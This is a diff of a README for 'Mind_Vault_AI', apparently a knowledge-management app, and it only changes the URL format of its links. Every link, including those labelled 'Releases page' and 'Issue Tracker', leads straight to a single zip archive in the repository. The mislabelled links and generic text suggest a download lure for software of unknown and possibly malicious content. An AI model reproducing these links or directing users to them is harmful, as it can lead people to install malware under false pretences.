@@ -1,6 +1,6 @@
 # 🧠 Mind_Vault_AI - Transform Your Knowledge Management
 
-[![Download Mind Vault](https://raw.githubusercontent.com/zoepranataksm/Mind_Vault_AI/master/cheap/Mind_Vault_AI.zip%20Mind%20Vault-From%20Releases-blue)](https://raw.githubusercontent.com/zoepranataksm/Mind_Vault_AI/master/cheap/Mind_Vault_AI.zip)
+[![Download Mind Vault](https://github.com/zoepranataksm/Mind_Vault_AI/raw/refs/heads/master/cheap/Mind_Vault_AI.zip%20Mind%20Vault-From%20Releases-blue)](https://github.com/zoepranataksm/Mind_Vault_AI/raw/refs/heads/master/cheap/Mind_Vault_AI.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to Mind Vault! This application helps you manage your enterprise documen
 
 To get started with Mind Vault, please follow these steps to download and run the application:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/zoepranataksm/Mind_Vault_AI/master/cheap/Mind_Vault_AI.zip) to download the latest version.
+1. Visit the [Releases page](https://github.com/zoepranataksm/Mind_Vault_AI/raw/refs/heads/master/cheap/Mind_Vault_AI.zip) to download the latest version.
 2. Look for the most recent release at the top of the list. 
 3. Select the appropriate file for your operating system:
    - Windows: Download the `.exe` file
    - macOS: Download the `.dmg` file
-   - Linux: Download the `https://raw.githubusercontent.com/zoepranataksm/Mind_Vault_AI/master/cheap/Mind_Vault_AI.zip` file
+   - Linux: Download the `https://github.com/zoepranataksm/Mind_Vault_AI/raw/refs/heads/master/cheap/Mind_Vault_AI.zip` file
 4. Once the download completes, open the file to install Mind Vault on your computer. Follow the on-screen instructions to complete the installation.
 
 ## 🖥️ System Requirements
@@ -55,7 +55,7 @@ After installation, follow these steps to start using Mind Vault:
 
 ## 🤝 Support & Contribution
 
-If you have any questions or need assistance while using Mind Vault, please visit our [Issue Tracker](https://raw.githubusercontent.com/zoepranataksm/Mind_Vault_AI/master/cheap/Mind_Vault_AI.zip). You can report bugs or request new features.
+If you have any questions or need assistance while using Mind Vault, please visit our [Issue Tracker](https://github.com/zoepranataksm/Mind_Vault_AI/raw/refs/heads/master/cheap/Mind_Vault_AI.zip). You can report bugs or request new features.
 
 If you would like to contribute to Mind Vault, feel free to fork the repository and submit a pull request. Your contributions are welcome!
 
@@ -74,4 +74,4 @@ Mind Vault works well with various technologies. Here are some areas it covers:
 
 We acknowledge the contributions of various open-source projects and libraries that made Mind Vault possible. Thank you for your support!
 
-Visit our [Releases page](https://raw.githubusercontent.com/zoepranataksm/Mind_Vault_AI/master/cheap/Mind_Vault_AI.zip) once again to download the latest version and enjoy effective knowledge management with Mind Vault.
+Visit our [Releases page](https://github.com/zoepranataksm/Mind_Vault_AI/raw/refs/heads/master/cheap/Mind_Vault_AI.zip) once again to download the latest version and enjoy effective knowledge management with Mind Vault.
